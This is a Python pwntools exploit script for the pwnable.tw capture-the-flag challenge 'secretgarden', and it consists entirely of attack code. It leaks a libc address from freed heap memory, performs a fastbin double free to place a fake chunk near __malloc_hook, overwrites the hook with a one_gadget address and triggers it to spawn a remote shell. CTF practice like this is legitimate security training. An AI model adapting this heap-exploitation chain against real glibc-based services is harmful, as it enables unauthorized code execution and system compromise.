from pwn import *

#context.log_level = 'debug'
e = ELF('./secretgarden')
#p = process(['./secretgarden'],env={'LD_PRELOAD':'./libc_64.so.6'})
p = remote('chall.pwnable.tw',10203)
#libc = e.libc
libc = ELF('./libc_64.so.6')
sa = lambda x,y : p.sendafter(x,y)
sla = lambda x,y : p.sendlineafter(x,y)
garden = 0x0000000000202040

def add(size,name,color):
	sa(':','1')
	sla('Length of the name :',str(size))
	sa('The name of flower :',name)
	sla('The color of the flower :',color)

def visit():
	sa(':','2')

def remove(idx):
	sa(':','3')
	sla(':',str(idx))

def clean():
	sa(':','4')

def leave():
	sa(':','5')

add(0x100,'A'*0x100,'ZZZZ')
add(0x100,'B'*0x100,'ZZZZ')
add(0x100,'C'*0x100,'ZZZZ')
remove(0)
remove(1)
add(0x100,'D'*8,'D')
visit()
p.recvuntil('D'*8)
libc_base = u64(p.recv(6)+'\x00\x00') - 0x3c3b20 - 344
log.info('libc_base : {}'.format(hex(libc_base)))
malloc_hook = libc_base + 0x3c3b10
log.info('__malloc_hook = {}'.format(hex(malloc_hook)))
add(0x60,'a','a')
add(0x60,'b','b')
remove(4)
remove(5)
remove(4)
add(0x60,p64(malloc_hook-35),'A')
add(0x60,'A','A')
add(0x60,'A','A')
oneshot = [0x45216,0x4526a,0xf02a4,0xf1147] # local
oneshot = [0x45216,0x4526a,0xef6c4,0xf0567] # remote
add(0x60,'A'*19+p64(libc_base + 0xef6c4),'A')

remove(2)
remove(2)

p.interactive()
